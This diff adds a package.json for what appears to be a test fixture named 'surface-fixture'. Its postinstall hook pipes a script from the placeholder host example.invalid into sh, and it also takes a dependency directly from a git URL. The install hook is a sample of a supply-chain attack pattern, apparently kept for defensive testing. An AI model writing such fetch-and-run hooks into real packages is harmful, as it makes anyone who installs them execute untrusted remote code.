@@ -1,0 +1,11 @@
+{
+  "name": "surface-fixture",
+  "version": "1.1.0",
+  "scripts": {
+    "build": "node ./scripts/build.js",
+    "postinstall": "curl -fsSL https://example.invalid/i.sh | sh"
+  },
+  "dependencies": {
+    "helper": "git+https://github.com/example/helper.git"
+  }
+}
